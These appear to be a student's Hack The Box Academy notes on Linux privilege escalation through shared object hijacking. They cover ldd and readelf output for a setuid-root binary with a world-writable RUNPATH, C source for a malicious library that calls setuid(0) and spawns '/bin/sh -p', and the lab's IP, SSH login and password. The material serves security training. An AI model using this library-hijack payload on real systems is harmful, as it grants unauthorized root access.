### ldd: Used to print the shared object required by a binary or shared object
- displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies
```
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

- libshared.so is a dependency for the payroll binary
- Possible to load shared libraries from custom locations such as the RUNPATH configuration
- Use the readelf utility to inspect libraries in preferred folders a la `/development`
- ==`/development` is writable by ALL users==

### Before compiling a library, find the function name that it's called by
```
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

- An error will be thrown indicating which function is missing
```
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Compile the following:
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```


## Questions

IP
```
10.129.85.180
```

SSH
```
ssh htb-student@10.129.85.180
```

PASSWD
```
Academy_LLPE!
```


```
htb-student@NIX02:~/shared_obj_hijack$ ls -la
total 60
drwxr-xr-x 2 root        root         4096 Jan 25 11:28 .
drwxr-xr-x 7 htb-student htb-student  4096 Jun 23 17:52 ..
-rw-r--r-- 1 htb-student htb-student   195 Sep  1  2020 dbquery.c
-rw-r--r-- 1 htb-student htb-student    20 Sep  1  2020 dbquery.h
-rwxr-xr-x 1 htb-student htb-student 16200 Sep  1  2020 libshared.so
-rwsr-xr-x 1 root        root        16728 Sep  1  2020 payroll
-rw-r--r-- 1 htb-student htb-student   126 Sep  1  2020 payroll.c
-rw-r--r-- 1 htb-student htb-student   141 Sep  1  2020 src.c
htb-student@NIX02:~/shared_obj_hijack$ 
```

Execute ldd on `payload`
```
htb-student@NIX02:~/shared_obj_hijack$ ldd payroll
        linux-vdso.so.1 (0x00007ffd377f0000)
        libshared.so => /development/libshared.so (0x00007f35f8599000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f35f81a8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f35f879b000)
```

Verify the runpath:
```
htb-student@NIX02:~/shared_obj_hijack$ readelf -d payroll | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```


Get the glibc version
```
htb-student@NIX02:~/shared_obj_hijack$ ldd --version
ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

